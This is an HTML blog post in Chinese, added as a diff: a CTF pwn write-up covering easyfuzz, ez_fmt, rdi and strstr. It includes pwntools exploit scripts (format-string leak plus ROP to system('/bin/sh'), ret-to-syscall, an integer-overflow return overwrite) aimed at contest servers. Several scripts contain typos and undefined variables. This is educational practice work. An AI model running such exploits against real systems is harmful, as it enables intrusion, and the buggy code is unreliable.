@@ -1,0 +1,749 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Modifier">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="持续更新">
+<meta property="og:type" content="article">
+<meta property="og:title" content="刷题进行中">
+<meta property="og:url" content="https://shmodifier.github.io/2023/12/18/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/index.html">
+<meta property="og:site_name" content="Modifier">
+<meta property="og:description" content="持续更新">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://shmodifier.github.io/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/%E9%A1%B5%E9%A6%96%E5%9B%BE.jpg">
+<meta property="article:published_time" content="2023-12-18T10:55:10.000Z">
+<meta property="article:modified_time" content="2023-12-30T11:01:46.814Z">
+<meta property="article:author" content="Modifier">
+<meta property="article:tag" content="fmt">
+<meta property="article:tag" content="栈迁移">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://shmodifier.github.io/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/%E9%A1%B5%E9%A6%96%E5%9B%BE.jpg">
+  
+  
+  
+  <title>刷题进行中 - Modifier</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"shmodifier.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":false,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Have a nice day!</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/%E9%A1%B5%E9%A6%96%E5%9B%BE.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="刷题进行中"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-18 18:55" pubdate>
+          2023年12月18日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          35 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">刷题进行中</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>持续更新</p>
+<span id="more"></span>
+
+<h1 id="强网"><a href="#强网" class="headerlink" title="强网"></a>强网</h1><h3 id="easyfuzz"><a href="#easyfuzz" class="headerlink" title="easyfuzz"></a>easyfuzz</h3><blockquote>
+<p>当时还做了一个 Misc 嘻嘻</p>
+</blockquote>
+<p>它最多输入 10byte 就是说</p>
+<p>一开始我就疯狂手动尝试，发现输入九位字符的时候会被覆盖成 110000000，其他情况不管怎么输入都是九个零</p>
+<p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/Snipaste_2023-12-16_10-28-32.png" srcset="/img/loading.gif" lazyload></p>
+<p>又尝试胡乱打了几下发现同是九位，输入 <code>asdf&#39;fdd</code> 就可以覆盖最高位的 0 了好神奇</p>
+<p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/Snipaste_2023-12-16_10-47-30.png" srcset="/img/loading.gif" lazyload></p>
+<p>又又再次多次尝试发现最后一位是 d，对应的最后一位就是1。同时只要输入是九位，不管输入的前两位怎么变，覆盖率前两位都是11。</p>
+<p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/Snipaste_2023-12-16_11-02-56.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以说覆盖率后七位和输入的后七位一一对应。误打误撞知道最后一位是d，那我们只需要爆破一下中间的六位就行。</p>
+<p>综上，我们只要保证一共输入九位，最后一位是d。只需要尝试枚举对应位值为0的位，对应位是1，那么就是已经找到了正确的值不需要改变了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> printable<br>io.remote(<span class="hljs-string">&#x27;101.200.122.251&#x27;</span>, <span class="hljs-number">12188</span>)<br><br>cover=[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]<br>payload=<span class="hljs-built_in">bytearray</span>(<span class="hljs-string">b&#x27;aaaaaaaad&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;bytes): &#x27;</span>)<br>i=<span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> i&gt;=<span class="hljs-built_in">len</span>(printable):<br>        i=i-<span class="hljs-built_in">len</span>(printable)<br>    ch=printable[i]<br>    j=cover.index(<span class="hljs-number">0</span>)<br>    payload[j]=<span class="hljs-built_in">ord</span>(ch)<br>    io.sendline(payload)<br>    io.recvuntil(<span class="hljs-string">b&#x27;coverage: &#x27;</span>)<br>    received_data = io.recvline().strip().decode()<br>	cover = []<br>	<span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> received_data:<br>    	cover.append(<span class="hljs-built_in">int</span>(item))<br>    <span class="hljs-keyword">if</span> cover.count(<span class="hljs-string">&#x27;1&#x27;</span>)==<span class="hljs-number">9</span>:<br>        <span class="hljs-keyword">break</span><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>最后就暴力破解出来是 <code>xxqwbGood</code> 就可以让所有的位都是0。</p>
+<h3 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h3><blockquote>
+<p>就会这一道（x</p>
+</blockquote>
+<p>没有 PIE 保护其他的都开了，进去一眼就是格式化字符串漏洞，但是原题目中的漏洞只能利用一次。</p>
+<p>因为 64 位有前 6 位的寄存器传参所以 buf 是第 11 个参数。</p>
+<p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/ez_fmt_main.png" srcset="/img/loading.gif" lazyload></p>
+<p>利用思路：</p>
+<ul>
+<li><p>首先需要劫持控制流让程序多次利用漏洞。</p>
+</li>
+<li><p>里面没有现成的后门函数可以利用，要手动构造 ROP gadget 。</p>
+</li>
+</ul>
+<p>首先我们要考虑如何多次利用这个字符串漏洞。由于 read 的输入限制，我们没有办法通过溢出来改变 main 函数的返回地址。</p>
+<p>在 gdb 中可以发现——rsp 指向 <code>buf-8</code> 的位置，也就是 read 的返回地址</p>
+<p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/ez_fmt_ret.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然在 printf 中也一样，<strong>栈上方是当前子函数的返回地址，栈的下方是整个 main 函数的返回地址。</strong></p>
+<p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/ez_fmt_ret2.png" srcset="/img/loading.gif" lazyload></p>
+<p>因为我们已知 buf 的地址，所以这样我们就能够让 printf 劫持自己的地址，从而回到 read 多次利用格式化字符串漏洞。</p>
+<p>我们以控制 printf 函数返回到 csu_init 的 gadget 的位置，然后经过三次出栈操作，rsp 指向 <code>buf + 0x18</code>（每次 <code>pop</code> +8） ，执行 ret 。<code>buf + 0x18</code> 的值也是我们可控的，我们就可以修改它到执行 read 函数的地址。其中 0-0x18 中间的空隙我们用无意义的字符填充就好。</p>
+<p>这样程序流程就变成了 <code>printf(buf) -&gt; gadget -&gt; read(0, buf,0x30)</code>。</p>
+<p>因为 <code>printf(buf)</code> 的地址 <code>0x40122D</code> 和 csu_init 地址 <code>0x4012CE</code>仅有低字节不同，所以只需要修改低字节。</p>
+<p>泄露地址和修改地址的操作可以同时完成。我们通过观察栈可以计算出 <code>__lic_start_call_main</code> 的偏移为  19</p>
+<p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/ez_fmt_%E5%81%8F%E7%A7%BB.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来直接在 read 里构造 ROP 链就行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io = process(<span class="hljs-string">&quot;./ez_fmt&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br><br>pop_rdi = <span class="hljs-number">0x04012d3</span><br>read_addr=<span class="hljs-number">0x0401205</span><br>bin_sh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>system = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>io.recvuntil(<span class="hljs-string">b&#x27;There is a gift for you &#x27;</span>)<br>gift = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(gift)<br><br>payload = <span class="hljs-string">&quot;%&#123;0xce&#125;c%10$hhn%19$p&quot;</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;A&#x27;</span>).encode()+p64(read_addr)+p64(gift-<span class="hljs-number">0x8</span>)<br>io.send(payload)<br>gdb.attch(io)<br>io.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br><br>libc_base = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - (libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]+<span class="hljs-number">128</span>)<br><span class="hljs-built_in">print</span>(libc_addr)<br><br>payload=flat(<br>    &#123;<br>        <span class="hljs-number">0x18</span>:p64(pop_rdi)+p64(libc_base+bin_sh)+p64(libc_base+system)<br>    &#125;<br>)<br><br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>学会了个语法用字典来填充字符串，例如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">flat<br>(<br>    &#123;<br>        <span class="hljs-number">0</span>:<span class="hljs-string">&quot;%&#123;&#125;c%11$hhn%19$p&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0xce</span>)<br>        <span class="hljs-number">0x18</span>:p64(read_addr)+p64(gift-<span class="hljs-number">0x8</span>)<br>    &#125;<br>)<br></code></pre></td></tr></table></figure>
+
+<p><code>flat()</code> 函数用于将多个变量打包成二进制格式的字符串，字典部分 <code>&#123;x:&quot;&quot;&#125;</code> ，意味从 偏移为 x 的地方开始填充键值对应的字符串，剩余部分用随机字符填充。</p>
+<p>示例中的字典语句意为：从偏移为 0 的地方填充格式化字符串利用的字符，从偏移为 0x18 的地方开始填充两个地址数据，中间的部分用随机字符填充。最后由 <code>flat</code> 将他们打包成字符串。</p>
+</blockquote>
+<h1 id="FSCTF"><a href="#FSCTF" class="headerlink" title="FSCTF"></a>FSCTF</h1><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p><code>tac fl* &gt;&amp;2</code></p>
+<p>这个命令的作用如下：</p>
+<ul>
+<li><code>tac</code>：<code>tac</code> 命令用于颠倒文本文件中的行。它以相反的顺序打印文件的行。</li>
+<li><code>fl*</code>：这是一个通配符模式，用于匹配当前目录中以 “fl” 开头的文件的名称。例如，它可能匹配文件如 “flag.txt” 或 “flag.dat”。</li>
+<li><code>&gt;&amp;2</code>：命令的这部分将输出重定向到标准错误（文件描述符 2），而不是标准输出（文件描述符 1）。</li>
+</ul>
+<p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/nc.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="rdi"><a href="#rdi" class="headerlink" title="rdi"></a>rdi</h3><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/rdi_checksec.png" srcset="/img/loading.gif" lazyload></p>
+<p>没有 canary 保护和 PIE 保护</p>
+<p>丢进 ida 看看</p>
+<p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/rdi_read.png" srcset="/img/loading.gif" lazyload></p>
+<p>info 里是程序的两行输入，接着就是这个 <code>read()</code> 函数，可以溢出。</p>
+<p>另外就是 gift 函数了，里面有个 syscall 系统调用但是没有 “&#x2F;bin&#x2F;sh” 字符串，根据汇编代码推断出需要利用 rdi 传入参数</p>
+<p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/rdi_syscall.png" srcset="/img/loading.gif" lazyload></p>
+<p>因为开启了 NX 保护，我们不再直接向栈上注入 shellcode </p>
+<p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/rdi_gadget.png" srcset="/img/loading.gif" lazyload></p>
+<p>顺便找一下 ‘&#x2F;bin&#x2F;sh’</p>
+<p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/rdi_sh.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p=process(&#x27;./rdi&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28911</span>)<br><br>rdi=<span class="hljs-number">0x04007d3</span><br>bin_sh=<span class="hljs-number">0x040080d</span><br>syscall=<span class="hljs-number">0x04006FB</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)<br><span class="hljs-comment">#如果溢出长度够的话还可以通过泄露libc地址打</span><br><span class="hljs-comment">#payload=b&#x27;a&#x27;*0x88+p64(pop_rdi)+p64(read_got)+p64(puts_plt)+p64(main)</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;ready for your answer:\n&#x27;</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="strstr"><a href="#strstr" class="headerlink" title="strstr"></a>strstr</h3><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/strstr_checksec.png" srcset="/img/loading.gif" lazyload></p>
+<p>没有 canary 保护和 PIE 保护，再丢进 ida 看看</p>
+<p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/strstr_main.png" srcset="/img/loading.gif" lazyload></p>
+<p>main函数里有个 <code>read()</code> 函数，但是看上去没有溢出空间</p>
+<p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/strstr_func.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>func()</code> 函数里有一个对输入的字符串 src 也就是 buf 的长度检测，由于这个函数的返回值是 <code>strcpy(s,src)</code>，我们不能使用 ‘\x00’ 来截断字符串。但这个记录 src 长度的 v3 是一个无符号的int型数据，可以通过整数溢出来绕过长度检测。</p>
+<p>我们就需要知道 unsigned __int8 的取值范围是多少，是0<del>255，那我们可以输入字符的长度就可以是 256</del>264，在这范围内的长度都可以获得shell</p>
+<p>然后就是这个后门函数了</p>
+<p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/strstr_syscall.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们接着来计算 offest ，我们无法利用 main 函数中的返回地址，只能利用 func 中的 <code>return strcpy()</code>，s 的长度是 b9 ，覆盖返回地址就是 b9+4。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br> <br>p =remote(<span class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28318</span>)<br>elf =ELF(<span class="hljs-string">&#x27;./strstr&#x27;</span>)<br> <br>backdoor =<span class="hljs-number">0x80492AF</span><br>ret_addr =<span class="hljs-number">0x804900a</span><br> <br>p.recvuntil(<span class="hljs-string">b&#x27;show me your power\n&#x27;</span>)<br> <br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0xb9</span> +<span class="hljs-number">4</span>) +p32(backdoor)<br>payload=payload.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;A&#x27;</span>)<br> <br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/stack_checksec.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn/" class="category-chain-item">pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/fmt/">#fmt</a>
+      
+        <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/">#栈迁移</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>刷题进行中</div>
+      <div>https://shmodifier.github.io/2023/12/18/刷题进行中/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Modifier</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/12/25/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" title="CSAPP 第十一章 网络编程">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CSAPP 第十一章 网络编程</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/17/malloc%E5%92%8Cfree%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="malloc和free源码分析">
+                        <span class="hidden-mobile">malloc和free源码分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    
+    <div class="footer-content">
